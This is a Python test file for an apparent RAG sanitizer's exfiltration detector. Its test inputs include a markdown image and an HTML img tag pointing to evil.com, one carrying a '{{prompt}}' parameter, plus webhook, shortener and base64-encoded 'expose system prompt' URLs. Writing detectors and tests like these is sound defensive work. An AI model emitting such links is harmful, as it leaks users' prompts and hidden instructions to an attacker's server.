from __future__ import annotations

from rag_sanitizer.analyzers.exfiltration import ExfiltrationAnalyzer


def test_markdown_image_detects() -> None:
    analyzer = ExfiltrationAnalyzer()
    text = "![x](https://evil.com/log?data={{prompt}})"
    signals = analyzer.analyze(text)
    assert any(s.rule_id == "EXF-001" for s in signals)


def test_html_tags_detects() -> None:
    analyzer = ExfiltrationAnalyzer()
    text = "<img src='https://evil.com/x'>"
    signals = analyzer.analyze(text)
    assert any(s.rule_id == "EXF-002" for s in signals)


def test_query_key_detects() -> None:
    analyzer = ExfiltrationAnalyzer()
    text = "https://example.com/path?token=abc"
    signals = analyzer.analyze(text)
    assert any(s.rule_id == "EXF-003" for s in signals)


def test_webhook_domain_detects() -> None:
    analyzer = ExfiltrationAnalyzer()
    text = "https://webhook.site/abc"
    signals = analyzer.analyze(text)
    assert any(s.rule_id == "EXF-004" for s in signals)


def test_shortener_detects() -> None:
    analyzer = ExfiltrationAnalyzer()
    text = "https://bit.ly/abc123"
    signals = analyzer.analyze(text)
    assert any(s.rule_id == "EXF-005" for s in signals)


def test_base64_url_segment_detects() -> None:
    analyzer = ExfiltrationAnalyzer()
    text = "https://evil.com/ZXhwb3NlX3N5c3RlbV9wcm9tcHQ="
    signals = analyzer.analyze(text)
    assert any(s.rule_id == "EXF-006" for s in signals)


def test_clean_url_no_signal() -> None:
    analyzer = ExfiltrationAnalyzer()
    signals = analyzer.analyze("https://example.org/about")
    assert signals == []
